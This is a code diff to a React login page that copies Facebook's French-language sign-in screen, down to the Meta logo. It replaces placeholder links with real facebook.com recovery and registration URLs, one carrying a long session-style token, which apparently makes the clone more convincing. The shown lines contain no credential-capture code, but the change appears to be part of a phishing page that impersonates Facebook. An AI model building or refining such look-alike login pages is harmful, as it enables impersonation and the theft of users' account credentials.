@@ -127,7 +127,7 @@ export default function Home() {
                       {errors.identifiant.includes("associé à un compte") && (
                         <>
                           {" "}
-                          <a href="#" className="font-bold hover:underline">Trouvez votre compte et connectez-vous.</a>
+                          <a href="https://web.facebook.com/login/identify/?ci=Ac-5kzqoasyUt0sjvicZ9yk_wMU4ujoPBJdrDSupA0dUPXpyIdU9QQ-U_5JTCjG2WpOnXT80mGNL8xulXAe5XyG2RxIGhsbEoip7w3m4Jy9jGt9YNY4-QAE3fs2GXqUwqSALNV1ApnSPBiAUpoFlsw75BGTguMxNFPuQ-EZOpGgR8SQwSw_ePgbORFn8bCh-ibGGFhoIoFO5WJ-q_bIUfuHWDZow41PsQ57eafiPMOxIDcNbr1bv_P7gDfUy-e6tKNqnyPZb7HTAstualnIuUfcbq1nV" className="font-bold hover:underline text-blue-600">Trouvez votre compte et connectez-vous.</a>
                         </>
                       )}
                     </p>
@@ -193,15 +193,15 @@ export default function Home() {
 
             {/* Forgot Password */}
             <div className="text-center mb-4">
-              <a href="#" className="text-sm text-black hover:underline">
+              <a href="https://web.facebook.com/login/identify/?_rdc=1&_rdr#" className="text-sm text-black hover:underline">
                 Mot de passe oublié ?
               </a>
             </div>
 
             {/* Create Account Button */}
-            <button className="w-full border-2 border-blue-600 text-blue-600 hover:bg-blue-400 py-3 px-4 rounded-full text-base transition duration-200">
-              Créer un nouveau compte
-            </button>
+            <a href="https://web.facebook.com/reg/?entry_point=login&next=" className="block w-full border-2 border-blue-600 text-blue-600 hover:bg-blue-400 py-3 px-4 rounded-full text-base transition duration-200 text-center no-underline">
+              Créer un compte
+            </a>
 
             {/* Meta Logo */}
             <div className="mt-6 flex flex-row items-center justify-center gap-2">
